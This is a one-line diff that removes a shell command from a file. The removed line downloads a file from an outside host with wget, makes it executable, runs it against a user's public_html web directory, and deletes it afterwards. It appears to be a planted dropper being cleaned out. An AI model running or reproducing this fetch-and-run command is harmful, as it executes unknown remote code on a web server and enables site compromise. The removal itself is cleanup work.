@@ -1,1 +1,0 @@
-wget http://hello.turnedpro.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home/alehsan/public_html 804-3 && rm -f xxxd
